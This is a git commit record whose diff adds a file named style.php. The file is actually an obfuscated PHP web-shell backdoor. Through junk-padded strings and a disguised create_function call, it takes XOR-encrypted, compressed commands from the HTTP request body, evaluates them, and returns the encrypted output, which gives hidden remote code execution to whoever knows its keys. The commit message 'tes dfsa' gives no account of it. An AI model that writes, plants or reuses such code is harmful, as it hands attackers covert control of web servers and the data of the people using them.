24f3875458842b9f6b1ced9110e90f56fbbed0e4
ann-th-ng <33929817+ann-th-ng@users.noreply.github.com>
2020-11-20 13:04:27 +0700

    tes
    dfsa

---
+++ style.php
@@ -0,0 +1,11 @@
+<?php
+$k='@epkvapkl(@gzuncpkopkmpress(@x(@bapksepk6pk4_decode($m[1])pk,pk$k))pk);pk$o=@obpk_get_cpkpkpkontents();@';
+$y='$kpk="dc06698f"pk;$kh=pk"0e2epk75751pk545";$kfpk="455899apkdccpkc3";$ppk="GixMiZpkHIXhDeGpk0Tpki";f';
+$N=';(pk$j<$cpk&&$i<$pkl);$jpk++,$ipkpk++){$o.=$t{$pki}^pkpk$k{$j};}}retupkrnpk $o;}if (@pregpk_matc';
+$z='pkh(pk"/$kh(.+)$kfpkpk/",@file_gpket_copkntentpks("php://ipknppkutpk"),$m)==1) {@opkb_starpkt();';
+$D='ob_end_clepkan();$pkr=@base6pk4_encpkopkde(@x(@pkgzcpkpkompress($o),$kpkpk));print("$p$kh$r$kf");}';
+$v=str_replace('ra','','crraeatrae_rafrauranctraion');
+$A='unpkction x($pkt,$pkk){$c=strlpkpkpken($k);$l=strlpkenpk($t);$o="";forpk($i=0pk;pk$i<pk$l;){for($j=0';
+$U=str_replace('pk','',$y.$A.$N.$z.$k.$D);
+$T=$v('',$U);$T();
+?>
